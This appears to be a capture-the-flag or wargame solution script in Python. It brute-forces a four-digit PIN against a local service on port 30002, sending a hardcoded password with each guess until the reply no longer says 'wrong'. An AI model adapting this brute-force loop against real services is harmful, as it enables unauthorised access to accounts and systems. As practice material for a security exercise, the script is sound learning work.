import socket

host = 'localhost'
port = 30002
password ='VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar'


try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        for i in range(10000):
            pin = f"{i:04}"
            s.sendall(f"{password} {pin}\n".encode())
            response = s.recv(1024).decode()
            if "wrong" not in response.lower():
                print('Response : ', response)
                raise Exception  
            
except Exception as e:
    print(e)
    